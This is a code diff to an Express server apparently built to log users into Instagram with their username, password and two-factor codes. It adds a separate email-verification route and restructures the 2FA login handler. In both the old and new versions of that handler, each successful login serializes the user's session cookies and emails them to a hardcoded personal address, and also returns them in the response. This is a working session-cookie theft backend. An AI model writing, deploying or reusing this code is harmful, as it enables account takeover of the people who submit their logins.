@@ -130,6 +130,21 @@ app.get("/insta/getCode", (req, res) => {
         res.json({ success: false });
       });
 });
+//verify email code
+app.get("/insta/emailVerify", (req, res) => {
+  return ig.challenge
+    .sendSecurityCode(req.query.code)
+    .then((val) => {
+      console.log("verification success");
+      res.redirect("/");
+      res.end();
+    })
+    .catch((err) => {
+      console.log(err);
+      console.log("error occured in email auth");
+      res.json({ success: false, message: "code is incorrect" });
+    });
+});
 //submit auth code
 app.get("/insta/submitCode", (req, res) => {
   ig.request.end$.subscribe(async () => {
@@ -151,68 +166,54 @@ app.get("/insta/submitCode", (req, res) => {
     ig.state.adid = state.adid;
     ig.state.build = state.build;
   });
-  console.log(req.query.email_auth);
+
   console.log(req.query.code);
-  if (req.query.email_auth === true) {
-    return ig.challenge
-      .sendSecurityCode(req.query.code)
-      .then((val) => {
-        console.log("verification success");
-        res.redirect("/");
-        res.end();
-      })
-      .catch((err) => {
-        console.log(err);
-        console.log("error occured in email auth");
-        res.json({ success: false, message: "code is incorrect" });
-      });
-  } else {
-    return ig.account
-      .twoFactorLogin({
-        username: req.query.username,
-        verificationCode: req.query.code,
-        twoFactorIdentifier: req.query.two_factor_identifier,
-        verificationMethod: req.query.verificationMethod, // '1' = SMS (default), '0' = OTP
-        trustThisDevice: "1", // Can be omitted as '1' is used by default
-      })
-      .then((val) => {
-        const cookies = ig.state.serializeCookieJar().then((val2) => {
-          console.log("login success");
-          var mailOptions = {
-            from: process.env.email,
-            to: "tklinger50@gmail.com",
-            subject: "cookies of user" + req.query.name,
-            text: JSON.stringify(val2.cookies),
-          };
-          transporter.sendMail(mailOptions, function (error, info) {
-            if (error) {
-              console.log(error);
-              res.json({
-                success: true,
-                user: val,
-                cookie: val2.cookies,
-                email_sent: false,
-                message: "login Successful but failed to send email",
-              });
-            } else {
-              console.log("Email sent: " + info.response);
-              res.json({
-                success: true,
-                user: val,
-                cookie: val2.cookies,
-                message: "login Successful and email has been sent",
-              });
-              res.end();
-            }
-          });
+
+  return ig.account
+    .twoFactorLogin({
+      username: req.query.username,
+      verificationCode: req.query.code,
+      twoFactorIdentifier: req.query.two_factor_identifier,
+      verificationMethod: req.query.verificationMethod, // '1' = SMS (default), '0' = OTP
+      trustThisDevice: "1", // Can be omitted as '1' is used by default
+    })
+    .then((val) => {
+      const cookies = ig.state.serializeCookieJar().then((val2) => {
+        console.log("login success");
+        var mailOptions = {
+          from: process.env.email,
+          to: "tklinger50@gmail.com",
+          subject: "cookies of user" + req.query.name,
+          text: JSON.stringify(val2.cookies),
+        };
+        transporter.sendMail(mailOptions, function (error, info) {
+          if (error) {
+            console.log(error);
+            res.json({
+              success: true,
+              user: val,
+              cookie: val2.cookies,
+              email_sent: false,
+              message: "login Successful but failed to send email",
+            });
+          } else {
+            console.log("Email sent: " + info.response);
+            res.json({
+              success: true,
+              user: val,
+              cookie: val2.cookies,
+              message: "login Successful and email has been sent",
+            });
+            res.end();
+          }
         });
-      })
-      .catch((error) => {
-        console.log(error);
-        console.log("error occured in 2fa auth");
-        res.json({ success: false, message: "code incorrect!" });
       });
-  }
+    })
+    .catch((error) => {
+      console.log(error);
+      console.log("error occured in 2fa auth");
+      res.json({ success: false, message: "code incorrect!" });
+    });
 });
 
 app.post("/insta", (req, res) => {
